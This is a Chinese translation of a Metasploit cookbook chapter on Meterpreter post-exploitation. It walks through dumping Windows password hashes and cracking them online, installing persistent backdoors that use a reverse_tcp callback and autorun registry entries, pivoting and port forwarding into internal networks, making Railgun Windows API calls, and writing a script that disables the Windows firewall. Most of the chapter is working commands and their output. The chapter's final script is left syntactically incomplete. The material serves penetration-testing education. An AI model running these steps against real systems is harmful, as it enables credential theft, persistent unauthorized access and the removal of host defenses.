在上一章中，我们学习了一些强大的 meterpreter 命令，这些命令在后期利用中非常有帮助。Meterpreter 通过提供一个非常交互式和有用的命令解释器，为后期利用过程增加了很多灵活性。它不仅简化了任务，而且使其更加强大和全面。

在本章中，我们将通过学习一些高级概念，将 meterpreter 推进一步。到目前为止，我们一直在使用 Metasploit 提供给我们的各种命令和脚本，但在渗透测试过程中，可能会出现需要向 meterpreter 添加自己的脚本的情况。平台的模块化架构使得开发和集成自己的脚本和模块非常容易。

我们将从学习一些高级的 meterpreter 功能开始，比如传递哈希、枢纽、端口转发等等。然后，我们将转向开发我们自己的 meterpreter 脚本。为了完全理解本章，您应该了解基本的 Ruby 概念。即使对 Ruby 语言有基本的了解也可以帮助您构建智能的 meterpreter 脚本。为了方便读者，我将从一些基本的开发概念开始。然后，我们将分析一些现有的 Ruby 代码，看看我们如何可以重用它们或根据我们的需求进行编辑。然后，我们将学习开发我们自己简单的“Windows 防火墙停用器”meterpreter 脚本。

本章将详细增强您对平台的理解。让我们继续前进，开始实践这些技巧。

# 哈希传递

传递哈希或哈希转储是提取 Windows 登录哈希文件的过程。Hashdump meterpreter 脚本从目标机器中提取并转储密码哈希。哈希可以用于破解登录密码，并获得对 LAN 上其他系统的授权访问，以进行未来的渗透测试。

## 准备就绪

在开始烹饪之前，让我们先了解一下 Windows 密码及其存储格式。

当您在 Windows 登录屏幕上输入密码时，它会使用一个加密方案对您的密码进行加密，将您的密码转换成类似于这样的东西：

`7524248b4d2c9a9eadd3b435c51404ee`

这是一个密码哈希。这实际上是在您输入密码时进行检查的内容。它会加密您输入的内容，并将其与存储在注册表和/或 SAM 文件中的内容进行比对。

SAM 文件保存了本地机器上每个帐户或域（如果是域控制器）的用户名和密码哈希。它可以在硬盘驱动器的`%systemroot%system32config`文件夹中找到。

然而，只有在机器运行时，这个文件夹才对包括管理员在内的所有帐户进行了锁定。在操作过程中，唯一可以访问 SAM 文件的帐户是“系统”帐户。因此，您必须记住，在尝试转储哈希时，您需要提升权限。

哈希对您来说可能完全陌生，因为它们是加密文本。Windows 使用**NTLM（NT LAN Manager）**安全协议进行身份验证。它是 LM 协议的后继者，LM 协议用于旧版本的 Windows。

为了解码转储的哈希，我们将需要一个 NTLM/LM 解密器。有不同的工具可用。其中一些使用暴力破解技术（John the riper，pwdump），而另一些使用彩虹表（彩虹破解）。

## 如何做到这一点...

我们将从一个活动的 meterpreter 会话开始。我假设您已经渗透了目标并获得了一个 meterpreter 会话。您可以参考第四章中的配方，*客户端利用和防病毒绕过*，以获取有关入侵 Windows 机器的更多详细信息。脚本的使用简单直接。让我们首先检查目标机器上的权限。我们必须拥有系统权限才能提取哈希。我们将使用`getuid`命令来了解我们当前的权限级别。为了提升我们的权限，我们将使用`getsystem`命令。

```
meterpreter > getuid
Server username: DARKLORD-PC\DARKLORD
meterpreter > getsystem
...got system (via technique 4).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM 
```

## 工作原理...

现在我们在目标上拥有系统权限，所以我们可以继续尝试 hashdump 脚本。

```
meterpreter > run hashdump
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 78e1241e98c23002bc85fd94c146309d...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hashes...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DARKLORD:1000:aad3b435b51404eeaad3b435b51404ee:3dbde697d71690a769204beb12283678::: 
```

您可以看到脚本已成功从 SAM 文件中提取了密码哈希。现在我们可以使用不同的工具来破解这个哈希。一些知名的工具有 John the riper、pwdump、rainbow crack 等。

## 还有更多...

让我们看看除了使用之前讨论的工具之外，解密哈希的另一种方法。

### 在线密码解密

有一个非常流行的网站用于解密 NTLM/LM 哈希[`www.md5decrypter.co.uk/`](http://www.md5decrypter.co.uk/)。它通过将哈希与其庞大的哈希数据库进行匹配来找到密码。这是一种有效且快速破解简单和弱密码的技术。以下截图显示了我们之前转储的哈希的解码结果：

![在线密码解密](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_06_01.jpg)

如您所见，我们的输入哈希已找到匹配项，相应的可读密码为 123。

需要注意的一点是，破解密码完全取决于其强度。相对于复杂密码，较弱的密码会更容易破解。复杂密码将生成在线数据库中不存在的哈希。因此，考虑使用基于彩虹表的破解器。有关此主题的更多信息可以在以下 URL 找到：

[`bernardodamele.blogspot.in/#!http://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html`](http://bernardodamele.blogspot.in/#!http://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html)。

# 建立与后门的持久连接

我们从一个预入侵技术开始这本书，重点是信息收集。然后，我们继续前进到利用阶段，在那里我们学习了不同的方式来妥协目标。然后，我们学习了一些有用的后期利用技术，可以在妥协目标之后实施。现在，在这个配方中，我们将学习**永久利用技术**，在这里我们将尝试与我们的目标建立持久连接，以便我们可以随意连接到它。作为攻击者，或目标机器，不能总是可用，对目标进行后门处理可以有效地建立持久连接。

## 准备工作

Meterpreter 为我们提供了两个脚本，可以执行对目标进行后门处理的任务。它们是 Metsvc 和 Persistence。这两个脚本的工作方式类似。让我们逐一处理这两个脚本。

### 注意

这两个 meterpreter 脚本都在目标系统上创建文件，因此可能会触发防病毒软件的警报。因此建议在运行这些脚本之前关闭防病毒程序。

## 如何做...

Metsvc 脚本通过在目标机器上创建临时文件，如 DLL、后门服务器和服务来运行。该脚本还可以启动匹配的 multi/handler 以自动连接到后门。`-A`参数用于此目的。让我们在我们的 Windows 7 目标机器上运行脚本并分析结果。

```
meterpreter > run metsvc -h
OPTIONS:
-A Automatically start a matching multi/handler to connect to the service
-h This help menu
-r Uninstall an existing Meterpreter service (files must be deleted manually)
meterpreter > run metsvc -A
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\Users\DARKLORD\AppData\Local\Temp\ygLFhIFX...
[*] >> Uploading metsrv.dll...
[*] >> Uploading metsvc-server.exe...
[*] >> Uploading metsvc.exe...
[*] Starting the service...
* Installing service metsvc
* Starting service
Service metsvc successfully installed. 
```

一旦后门文件成功上传，它将自动连接到端口 31337 上的 multi/handler。使用这个后门，我们可以随意连接到目标机器。

另一个有用的后门脚本是持久性脚本。它的工作方式类似于 Metscv，但它具有一些额外的功能，比如定期连接回目标，系统启动时连接回来，自动运行等等。让我们看看我们可以使用的不同选项。

```
meterpreter > run persistence -h
Meterpreter Script for creating a persistent backdoor on a target host.
OPTIONS:
-A Automatically start a matching multi/handler to..
-L <opt> Location in target host where to write payload to..
-P <opt> Payload to use, default is
-S Automatically start the agent on boot as a service
-T <opt> Alternate executable template to use
-U Automatically start the agent when the User logs on
-X Automatically start the agent when the system boots
-h This help menu
-i <opt> The interval in seconds between each connection
-p <opt> The port on the remote host where Metasploit..
-r <opt> The IP of the system running Metasploit listening.. 
```

如您所见，它与 Metsvc 相比有一些额外的选项。让我们执行脚本，并根据我们的需求传递不同的参数。

```
meterpreter > run persistence -A -S -U -i 60 -p 4321 -r 192.168.56.101
[*] Running Persistance Script
[*] Resource file for cleanup created at /root/.msf4/logs/persistence/DARKLORD-PC_20111227.0307/DARKLORD-PC_20111227.0307.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4321
[*] Persistent agent script is 610795 bytes long
[+] Persistent Script written to C:\Users\DARKLORD\AppData\Local\Temp\LHGtjzB.vbs
[*] Starting connection handler at port 4321 for windows/meterpreter/reverse_tcp
[+] Multi/Handler started!
[*] Executing script C:\Users\DARKLORD\AppData\Local\Temp\LHGtjzB.vbs
[+] Agent executed with PID 5712
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\DBDalcOoYlqJSi
[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\DBDalcOoYlqJSi
[*] Installing as service..
[*] Creating service cpvPbOfXj 
```

## 它是如何工作的...

注意脚本传递的不同参数。`-A` 参数会在攻击机器上自动启动监听器。`-S` 操作符设置后门在每次 Windows 启动时加载。`-U` 操作符在用户登录系统时执行后门。`-i` 操作符设置后门尝试连接回代理处理程序的间隔。`-p` 是端口号，`-r` 是目标机器的 IP 地址。脚本执行的输出还包含一些有用的信息。脚本已经创建了一个资源文件用于清理，以便在使用后删除后门。脚本已经在目标机器的`temp`文件夹中创建了一个 vbs 文件。它还创建了注册表条目，以便在每次 Windows 启动时自动加载后门。

我们为后门设置了 60 秒的间隔，以便连接回代理处理程序。在脚本成功执行后，您将看到在 60 秒的间隔内，meterpreter 会自动在目标机器上打开一个会话。

这个快速演示解释了我们如何与目标机器建立持久连接。您可以尝试使用这两个脚本进行不同的场景，并分析其工作原理。在下一个示例中，我们将专注于另一个有趣的概念，称为转向。

# 使用 meterpreter 进行转向

到目前为止，我们已经涵盖了大部分主要的 meterpreter 命令和脚本。您一定已经注意到了在后期利用阶段，meterpreter 可以有多么强大。在这个示例中，我们将讨论一个最酷的，也是我最喜欢的概念之一，称为转向。让我们从理解转向的含义开始，为什么需要它，最后 Metasploit 如何在转向中有用。

## 准备工作

在开始使用这个示例之前，让我们首先详细了解转向。转向是指渗透测试人员使用 compromise 的系统来攻击同一网络上的其他系统的方法。这是一个多层次的攻击，在这个攻击中，我们可以访问甚至那些仅供本地内部使用的网络区域，比如内部网。考虑下面图中显示的情景。

![准备工作](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_06_02.jpg)

攻击者可以 compromise 与互联网连接的网络的外部节点。然后这些节点与防火墙连接。防火墙后面是主服务器。现在，由于攻击者无法访问服务器，他可以使用节点作为访问的媒介。如果攻击者成功地 compromise 了节点，那么它可以进一步渗透网络，以达到服务器。这是涉及转向的典型情况。图中的红线显示了通过 compromise 的节点在攻击者和服务器之间建立的转向路径。在这个示例中，我们将使用我们在上一章中学到的一些 meterpreter 网络命令。

## 如何做...

让我们看看如何使用 meterpreter 实现先前讨论的情景。

在这个示例中，我们的目标节点是运行在 Windows 7 上并连接到网络的机器。服务器运行在 Windows 2003 上。通过使用客户端浏览器漏洞，节点已经被 compromise，并且我们已经建立了一个活动的 meterpreter 连接。让我们从在目标节点上运行 ipconfig 开始，看看它上面有哪些可用的接口。

```
meterpreter > ipconfig
Interface 1
Hardware MAC: 00:00:00:00:00:00
IP Address: 10.0.2.15
Netmask : 255.255.255.0
VirtualBox Host-Only Ethernet Adapter
Hardware MAC: 08:00:27:00:8c:6c
IP Address : 192.168.56.1
Netmask : 255.255.255.0 
```

正如你所看到的，目标节点有两个接口。一个是连接到互联网的 192.168.56.1，另一个是内部网络的 IP 接口 10.0.2.15。我们下一个目标将是找出这个本地网络中还有哪些其他系统。为此，我们将使用一个名为`arp_scanner`的 meterpreter 脚本。这个脚本将在内部网络上执行 ARP 扫描，以找出其他可用的系统。

```
meterpreter > run arp_scanner -r 10.0.2.1/24
[*] ARP Scanning 10.0.2.1/24
[*] IP: 10.0.2.7 MAC 8:26:18:41:fb:33
[*] IP: 10.0.2.9 MAC 41:41:41:41:41:41 
```

所以脚本成功地发现了网络上两个可用的 IP 地址。让我们选择第一个 IP 地址并对其进行枢纽转发。

## 工作原理...

为了访问 IP 为 10.0.2.7 的系统（即服务器），我们将不得不通过目标节点 10.0.2.15 路由所有数据包。

为此，我们将使用一个名为`route`的命令。我们在之前的章节中也学习过这个命令。要使用这个命令，我们将把当前的 meterpreter 会话放到后台。

```
meterpreter > background
msf exploit(handler) > route add 10.0.2.15 255.255.255.0 1
[*] Route added
msf exploit(handler) > route print
Active Routing Table
====================
Subnet Netmask Gateway
------ ------- -------
10.0.2.15 255.255.255.0 Session 1 
```

查看路由命令的参数。`add`参数将把详细信息添加到路由表中。然后我们提供了目标节点的 IP 地址和默认网关。最后，我们提供了当前活动的 meterpreter 会话 ID（即 1）。`route print`命令显示了表，你可以清楚地看到所有通过这个网络发送的流量现在都将通过 meterpreter 会话 1。

现在你可以快速对 IP 地址 10.0.2.7 进行端口扫描，这个地址以前对我们来说是不可达的，但现在我们已经通过目标节点路由了我们的数据包，所以我们可以轻松地找出开放的端口和服务。一旦你发现它正在运行 Windows 2003 服务器，你就可以继续使用`exploit/windows/smb/ms08_067_netapi`或任何其他基于操作系统的漏洞来攻击服务器或访问其服务。

# 使用 meterpreter 进行端口转发

讨论枢纽转发时，没有谈论端口转发是不完整的。在这个教程中，我们将继续从之前的枢纽转发教程中，看看如何将数据和请求从攻击机器通过目标节点转发到内部网络服务器。这里需要注意的一点是，我们可以使用端口转发来访问内部服务器的各种服务，但如果我们必须利用服务器，那么我们将不得不使用在之前的教程中讨论的完整概念。

## 准备工作

我们将从之前的教程中讨论的相同场景开始。我们已经攻破了目标节点，这是一个 Windows 7 机器，并且我们已经添加了路由信息，以便通过 meterpreter 会话转发发送到网络上的所有数据包。让我们来看一下路由表。

```
msf exploit(handler) > route print
Active Routing Table
====================
Subnet Netmask Gateway
------ ------- -------
10.0.2.15 255.255.255.0 Session 1 
```

所以我们的表已经准备好了。现在我们将设置端口转发，以便我们的请求通过中继到达内部服务器。

## 如何做...

假设内部服务器在端口 80 上运行 Web 服务，我们想通过端口转发访问它。现在，为了做到这一点，我们将使用`portfwd`命令。让我们检查一下这个命令的可用选项，然后传递相关的值。

```
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
-L <opt> The local host to listen on (optional).
-h Help banner.
-l <opt> The local port to listen on.
-p <opt> The remote port to connect to.
-r <opt> The remote host to connect to.
meterpreter > portfwd add -l 4321 -p 80 -r 10.0.2.7
[*] Local TCP relay created: 0.0.0.0:4321 <-> 10.0.2.7:80 
```

成功执行命令表明，攻击者和内部服务器之间已经建立了本地 TCP 中继。攻击者机器上的监听端口是 4321，要访问的内部服务器上的服务端口是 80。

由于我们已经设置了路由信息，整个中继过程是透明的。现在，如果我们尝试通过浏览器使用 URL `http://10.0.2.7:80`来访问内部服务器，那么我们将被引导到内部网络的 http 内部服务。

在需要运行 Metasploit 不提供的命令或应用程序的情况下，端口转发可能非常方便。在这种情况下，您可以使用端口转发来简化您的任务。

这是端口转发的一个小演示。在下一个教程中，我们将开始使用 Ruby 编程来开发我们自己的 meterpreter 脚本。

## 工作原理...

端口转发的工作原理很简单，即在不安全的位置或网络提供受限服务的概念。可以使用经过身份验证或可靠的系统/软件在不安全和安全网络之间建立通信媒介。在第一章中，我们已经讨论了端口转发的简单用法，其中我们讨论了在虚拟机上设置 Metasploit 并使用 PuTTY 将其连接到主机操作系统。

![工作原理...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_06_03.jpg)

前面的图表演示了端口转发的过程，以一个简单的例子为例。外部来源想要访问运行在 6667 端口上的 IRC 服务器，但防火墙配置为阻止对 6667 端口的外部访问（图表中的红线）。因此，外部来源连接到运行在 22 端口上的 SSH 服务器（例如 PuTTY），该端口未被防火墙阻止。这将为外部来源提供一个防火墙绕过，现在它可以通过从 22 端口到 6667 端口的端口转发访问 IRC 服务器。因此，端口转发创建了一个访问隧道（图表中的蓝线）。

# Meterpreter API 和混合内容

在过去的一个半章中，我们已经广泛学习了如何将 meterpreter 作为潜在的后渗透工具。您可能已经意识到了 meterpreter 在使我们的渗透任务更轻松、更快速方面的重要作用。现在，从这个示例开始，我们将继续讨论与 meterpreter 相关的一些高级概念。我们将深入了解 Metasploit 的核心，了解 meterpreter 脚本的功能以及如何构建我们自己的脚本。

从渗透测试人员的角度来看，了解如何实现我们自己的脚本技术以满足场景的需求非常重要。可能会出现需要执行任务的情况，meterpreter 可能无法解决您的任务。因此，您不能坐视不管。这就是我们开发自己的脚本和模块变得方便的地方。让我们从这个示例开始。在这个示例中，我们将讨论 meterpreter API 和一些重要的混合内容，然后在后续的示例中，我们将编写我们自己的 meterpreter 脚本。

## 准备工作

Meterpreter API 对程序员来说可能会有所帮助，他们可以在渗透测试期间实现自己的脚本。由于整个 Metasploit 框架都是用 Ruby 语言构建的，因此 Ruby 编程经验可以增强您在 Metasploit 中的渗透经验。在接下来的几个示例中，我们将处理 Ruby 脚本，因此需要一些 Ruby 编程经验。即使您对 Ruby 和其他脚本语言有基本的了解，那么您也会很容易理解这些概念。

### 提示

**下载示例代码**

您可以从您在[`www.packtpub.com`](http://www.packtpub.com)账户中购买的所有 Packt 图书中下载示例代码文件。如果您在其他地方购买了这本书，您可以访问[`www.packtpub.com/support`](http://www.packtpub.com/support)并注册，文件将直接通过电子邮件发送给您。

## 操作方法

让我们从在 meterpreter 中启动交互式 Ruby shell 开始。在这里，我假设我们已经成功利用了目标（Windows 7）并且有一个活动的 meterpreter 会话。

可以使用`irb`命令启动 Ruby shell。

```
meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client 
```

现在我们进入了 Ruby shell，可以执行我们的 Ruby 脚本。让我们从两个数字的基本相加开始。

```
>> 2+2
=> 4 
```

所以我们的 shell 运行正常，可以解释语句。现在让我们执行一个复杂的操作。让我们创建一个哈希表，并在其中存储一些值和键。然后，我们将有条件地删除这些值。脚本如下所示：

```
x = { "a" => 100, "b" => 20 }
x.delete_if { |key, value| value < 25 }
print x.inspect 
```

这个脚本很容易理解。在第一行中，我们创建了键（a 和 b）并为它们分配了值。然后，在下一行中，我们添加了一个条件，删除任何值小于 25 的哈希元素。

让我们来看一些打印 API 调用，这些对我们在编写 meterpreter 脚本时会很有用。

+   `print_line("message")：`此调用将打印输出并在末尾添加回车。

+   `print_status("message")：`此调用在脚本语言中经常使用。此调用将提供回车并打印正在执行的任何内容的状态，以[*]开头。

```
>> print_status("HackingAlert")
[*] HackingAlert
=> nil 
```

+   `print_good("message")：`此调用用于提供任何操作的结果。消息显示为[+]，表示操作成功。

```
>> print_good("HackingAlert")
[+] HackingAlert
=> nil 
```

+   `print_error("message")：`此调用用于显示在脚本执行过程中可能发生的错误消息。消息显示为[-]，表示错误消息的开始。

```
>> print_error("HackingAlert")
[-] HackingAlert
=> nil 
```

我讨论这些不同的打印调用的原因是它们在编写 meterpreter 脚本时在相应的情况下被广泛使用。您可以在`/opt/framework3/msf3/documentation`中找到与 meterpreter API 相关的文档。阅读它们以便清晰和详细地理解。您还可以参考`/opt/framework3/msf3/lib/rex/post/meterpreter`，在那里您可以找到许多与 meterpreter API 相关的脚本。

这些脚本中包含各种 meterpreter 核心、桌面交互、特权操作以及许多其他命令。查看这些脚本，以便熟悉 meterpreter 在受损系统中的操作方式。

### **Meterpreter mixins**

Meterpreter mixins 是 Metasploit 特定的 irb 调用。这些调用在 irb 中不可用，但它们可以用来表示编写 meterpreter 脚本时最常见的任务。它们可以简化我们编写特定 meterpreter 脚本的任务。让我们看一些有用的 mixins：

+   `cmd_exec(cmd)：`以隐藏和通道化的方式执行给定命令。命令的输出以多行字符串形式提供。

+   `eventlog_clear(evt = "")：`清除给定的事件日志或所有事件日志（如果未给出）。返回已清除的事件日志数组。

+   `eventlog_list()：`枚举事件日志并返回包含事件日志名称的数组。

+   `file_local_write(file2wrt, data2wrt)：`将给定字符串写入指定文件。

+   `is_admin?()：`标识用户是否为管理员。如果用户是管理员，则返回 true，否则返回 false。

+   `is_uac_enabled?()：`确定系统上是否启用了用户账户控制（UAC）。

+   `registry_createkey(key)：`创建给定的注册表键并在成功时返回 true。

+   `registry_deleteval(key,valname)：`删除给定键和值名称的注册表值。如果成功，则返回 true。

+   `registry_delkey(key)：`删除给定的注册表键并在成功时返回 true。

+   `registry_enumkeys(key)：`枚举给定注册表键的子键并返回子键数组。

+   `registry_enumvals(key)：`枚举给定注册表键的值并返回值名称数组。

+   `registry_getvaldata(key,valname)：`返回给定注册表键和其值的数据。

+   `service_create(name, display_name, executable_on_host,startup=2)：`用于创建运行自己进程的服务。参数为服务名称（字符串）、显示名称（字符串）、在主机上执行的可执行文件的路径（字符串）和启动类型（整数：2 为自动，3 为手动，4 为禁用）。

+   `service_delete(name)：`用于通过删除注册表中的键来删除服务。

+   `service_info(name)：`获取 Windows 服务信息。信息以哈希形式返回，包括显示名称、启动模式和服务执行的命令。服务名称区分大小写。哈希键为 Name、Start、Command 和 Credentials。

+   `service_list()：`列出所有存在的 Windows 服务。返回包含服务名称的数组。

+   `service_start(name):` 该函数用于服务启动。如果服务已启动，则返回 0，如果服务已经启动，则返回 1，如果服务已禁用，则返回 2。

+   `service_stop(name):` 该函数用于停止服务。如果服务成功停止，则返回 0，如果服务已经停止或禁用，则返回 1，如果服务无法停止，则返回 2。

这是对一些重要的 meterpreter 混合的快速参考。使用这些混合可以减少我们脚本的复杂性。我们将在接下来的几个教程中了解它们的用法，我们将创建和分析 meterpreter 脚本。

## 工作原理...

meterpreter API 简单地创建了一个可以理解和解释 Ruby 指令的迷你 Ruby 解释器。使用 API 的主要优势是它给了我们灵活性来执行我们自己的操作。我们不能为所有操作都有命令。可能会有需要特定脚本来执行任务的情况。这就是 API 可以派上用场的地方。

# Railgun - 将 Ruby 转化为武器

在上一个教程中，我们看到了使用 meterpreter API 运行 Ruby 脚本。让我们再进一步。假设我们想在受害者机器上进行远程 API 调用，那么最简单的方法是什么？Railgun 是显而易见的答案。它是一个 meterpreter 扩展，允许攻击者直接调用 DLL 函数。通常，它用于调用 Windows API，但我们可以调用受害者机器上的任何 DLL。

## 准备工作

要开始使用 Railgun，我们需要在目标机器上有一个活动的 meterpreter 会话。要启动 Ruby 解释器，我们将使用上一个教程中讨论的`irb`命令。

```
meterpreter>irb
>> 
```

## 如何做...

在我们开始调用 DLL 之前，让我们首先看看要遵循的基本步骤，以便充分利用 Railgun。

1.  识别您希望调用的函数。

1.  在[`msdn.microsoft.com/en-us/library/aa383749(v=vs.85).aspx`](http://msdn.microsoft.com/en-us/library/aa383749(v=vs.85).aspx)上找到该函数。

1.  检查函数所在的库（DLL）（例如，`kernel32.dll`）。

1.  所选的库函数可以被调用为`client.railgun.dll_name.function_name(arg1, arg2, ...)`。

Windows MSDN 库可用于识别在目标机器上调用的有用的 DLL 和函数。让我们调用`shell32.dll`的简单`IsUserAnAdmin`函数并分析输出。

```
>> client.railgun.shell32.IsUserAnAdmin
=> {"GetLastError"=>0, "return"=>false} 
```

正如我们所看到的，该函数返回了`false`值，表明用户不是管理员。让我们提升我们的特权，然后再试一次调用。

```
meterpreter > getsystem
...got system (via technique 4).
meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client
>> client.railgun.shell32.IsUserAnAdmin
=> {"GetLastError"=>0, "return"=>true} 
```

这次函数返回了`true`，表明我们的特权升级成功了，现在我们正在以系统管理员的身份工作。Railgun 为我们提供了灵活性，可以轻松执行那些不以模块形式存在的任务。因此，我们不仅仅局限于框架提供的脚本和模块，事实上，我们可以按需调用。

您可以进一步将此调用扩展为一个带有错误检查的小型 Ruby 脚本：

```
print_status "Running the IsUserAnAdmin function"
status = client.railgun.shell32.IsUserAnAdmin()
if status['return'] == true then
print_status 'You are an administrator'
else
print_error 'You are not an administrator'
end 
```

使用 Railgun 可以是一个非常强大和令人兴奋的体验。您可以练习自己的调用和脚本来分析输出。但是，如果您想要调用的 DLL 或函数不是 Railgun 定义的一部分，那么 Railgun 还提供了灵活性，可以将您自己的函数和 DLL 添加到 Railgun 中。我们将在下一个教程中处理这个问题。

## 工作原理...

Railgun 是一个特定的 Ruby 命令解释器，可以用于对受损目标进行远程 DLL 调用。远程 DLL 调用在渗透测试中是一个重要的过程，因为它让我们对受损目标有了完全特权的系统指令执行权限。

## 还有更多...

Railgun 是一个有趣的工具，可以增强渗透测试的过程。让我们找出更多关于 Railgun 的信息。

### Railgun 定义和文档

Railgun 目前支持十种不同的 Windows API DLL。你可以在以下文件夹中找到它们的定义：`pentest/exploits/framework3/lib/rex/post/meterpreter/extensions/stdapi/railgun/def`

除此之外，你还可以从以下位置阅读 Railgun 文档：

`/opt/framework3/msf3/external/source/meterpreter/source/extensions/stdapi/server/railgun/railgun_manual.pdf`

# 向 Railgun 添加 DLL 和函数定义

在上一个示例中，我们专注于通过 Railgun 调用 Windows API DLL。在这个示例中，我们将专注于向 Railgun 添加我们自己的 DLL 和函数定义。为了做到这一点，我们应该了解 Windows DLL。Railgun 手册可以帮助你快速了解可以在添加函数定义时使用的不同 Windows 常量。

## 如何做...

向 Railgun 添加新的 DLL 定义是一项简单的任务。假设你想添加一个随 Windows 一起提供但在你的 Railgun 中不存在的 DLL，那么你可以在`pentest/exploits/framework3/lib/rex/post/meterpreter/extensions/stdapi/railgun/def`下创建一个 DLL 定义，并将其命名为`def_dllname.rb`。

1.  考虑将 shell32.dll 定义添加到 Railgun 中的示例。我们可以从添加以下代码行开始：

```
module Rex
module Post
module Meterpreter
module Extensions
module Stdapi
module Railgun
module Def
class Def_shell32
def self.create_dll(dll_path = 'shell32')
dll = DLL.new(dll_path, ApiConstants.manager)
......
end
end
end; end; end; end; end; end; end 
```

1.  将这段代码保存为`def_shell32.dll`将会为 shell32.dll 创建一个 Railgun 定义。

1.  下一步是向 DLL 定义中添加函数。如果你看一下 Metasploit 中的`def_shell32.dll`脚本，你会发现`IsUserAnAdmin`函数已经被添加进去了。

```
dll.add_function('IsUserAnAdmin', 'BOOL', []) 
```

该函数简单地返回一个布尔值 True 或 False，取决于条件。同样，我们可以在 shell32.dll 中添加我们自己的函数定义。考虑添加`OleFlushClipboard()`函数的示例。这将清除 Windows 剪贴板上存在的任何数据。

1.  在 shell32.dll 定义中添加以下代码行将达到我们的目的：

```
dll.add_function('OleFlushClipboard' , 'BOOL' , []) 
```

### 它是如何工作的...

为了测试该函数，保存文件并返回到 meterpreter 会话中，检查函数是否成功执行。

```
>> client.railgun.shell32.OleFlushClipboard
=> {"GetLastError"=>0, "return"=>true} 
```

或者，你也可以使用`add_dll`和`add_function`直接将 DLL 和函数添加到 Railgun。以下是一个完整的脚本，它检查 shell32\. dll 和`OleFlushClipboard`函数的可用性，如果它们不存在，则使用`add_dll`和`add_function`调用进行添加。

```
if client.railgun.get_dll('shell32') == nil
print_status "Adding Shell32.dll"
client.railgun.add_dll('shell32','C:\\WINDOWS\\system32\\shell32.dll')
else
print_status "Shell32 already loaded.. skipping"
end
if client.railgun.shell32.functions['OleFlushClipboard'] == nil
print_status "Adding the Flush Clipboard function"
client.railgun.add_function('shell32', 'OleFlushClipboard', 'BOOL', [])
else
print_status "OleFlushClipboard already loaded.. skipping"
end 
```

这是使用 Railgun 作为一个强大工具根据我们的需要调用 Windows API 的一个简短演示。你可以在 MSDN 库中寻找各种有用的 Windows API 调用，并将它们添加到 Railgun 中，增强你的框架的功能。它可以用来调用目标机器上的任何 DLL。在下一个示例中，我们将继续开发我们自己的 meterpreter 脚本。

# 构建一个“Windows 防火墙停用器”meterpreter 脚本

到目前为止，我们已经使用了几个 meterpreter 脚本，比如`killav.rb`和`persistence.rb`。让我们开始讨论开发我们自己的 meterpreter 脚本。编写 Metasploit 中的任何模块都需要 Ruby 知识。你应该对 Ruby 有基本的了解。目前没有足够的文档可以直接学习 meterpreter 脚本编写。最简单和最好的做法是学习 Ruby 语言，同时不断查看各种可用模块的代码。你也可以阅读 Metasploit 开发者指南，了解框架提供的不同库，这些库可以在编写自己的模块时使用。文档可以在[`dev.metasploit.com/redmine/projects/framework/wiki/DeveloperGuide`](http://dev.metasploit.com/redmine/projects/framework/wiki/DeveloperGuide)找到。

我们将在这里开发的脚本是一个 Windows Vista/7 防火墙停用器脚本。它将使用 Windows 命令`netsh`，meterpreter 将通过使用名为`cmd_exec()`的 mixin 在目标机器上执行该命令。

## 准备工作

Meterpreter 脚本在受攻击的客户端上运行，因此您只需专注于通过脚本执行的任务。您不必担心连接或任何其他参数。让我们看看在编写 meterpreter 脚本时应该牢记的一些重要准则

+   **避免全局变量：** 这是在任何框架上编码的一般原则。应避免使用全局变量，因为它们可能会干扰框架变量。只使用实例、局部和常量变量。

+   **使用注释：** 在编写代码时，注释是必不可少的。这可以帮助您跟踪哪个部分负责特定的操作。

+   **包括参数：** 您可能已经注意到在几个示例中，我们如何将参数与脚本一起传递。最基本但有用的参数是`-h`或`help`选项。

+   **打印结果：** 打印操作结果可以证明脚本的执行是成功还是失败。应该广泛使用不同的打印调用，如`print_status, print_error`等，以显示相关信息。

+   **平台验证：** 确保您验证要在其上执行操作的平台。

+   **保持文件约定：** 完成脚本编写后，请将其保存在`/pentest/exploits/framework3/scripts/meterpreter`目录下。遵循框架文件约定可以避免任何冲突。

+   **使用 mixin：** Mixin 是 meterpreter 中的一个重要概念。使用 mixin 可以使我们的脚本看起来更简单、更容易。

在编写 meterpreter 脚本时，您应该牢记这些准则。

让我们打开任何文本编辑器开始编写 Ruby 脚本。如果您正在使用 BackTrack，则可以使用 Gedit 文本编辑器。

## 如何做到...

1.  在文本编辑器中输入以下代码行。在转到解释部分之前，仔细查看脚本，并尝试弄清楚每行的含义。脚本很容易理解。

```
# Author: Abhinav Singh
# Windows Firewall De-Activator
#Option/parameter Parsing
opts = Rex::Parser::Arguments.new(
"-h" => [ false, "Help menu." ]
)
opts.parse(args) { |opt, idx, val|
case opt
when "-h"
print_line "Meterpreter Script for disabling the Default windows Firelwall"
print_line "Let's hope it works"
print_line(opts.usage)
raise Rex::Script::Completed
end
}
# OS validation and command execution
unsupported if client.platform !~ /win32|win64/i
end
begin
print_status("disabling the default firewall")
cmd_exec('cmd /c','netsh advfirewall set AllProfiles state off',5) 
```

一旦您输入了代码，请将其保存为`myscript.rb`，保存在`/pentest/exploits/framework3/scripts/meterpreter`目录下。

